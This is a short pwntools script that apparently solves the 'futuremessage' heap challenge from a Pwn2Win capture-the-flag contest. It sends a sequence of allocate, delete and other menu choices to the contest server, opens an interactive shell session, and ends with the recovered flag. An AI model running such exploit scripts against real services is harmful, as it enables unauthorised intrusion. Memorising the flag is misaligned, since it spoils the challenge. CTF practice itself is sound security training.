#!/usr/bin/env python3
from pwn import *
p = remote('futuremessage-pwn2win.southcentralus.cloudapp.azure.com', 1337)
for i in range(9):
    p.recvuntil('Choose your destiny:')
    p.sendline('1')
    p.recvuntil('Enter target:')
    p.sendline()
    p.recvuntil('Enter message size:')
    p.sendline('48')
    p.recvuntil('Enter message to the future:')
    p.sendline('x' * 47)
for i in range(9):
    p.recvuntil('Choose your destiny:')
    p.sendline('3')
    p.recvuntil('Enter message index to delete:')
    p.sendline(str(i))
for _ in range(9):
    p.recvuntil('Choose your destiny:')
    p.sendline('5')
p.recvuntil('Choose your destiny:')
p.sendline('4')
p.interactive()
# CTF-BR{S3nding_M3ssage_B4ck_To_The_Futur3_H34p!}
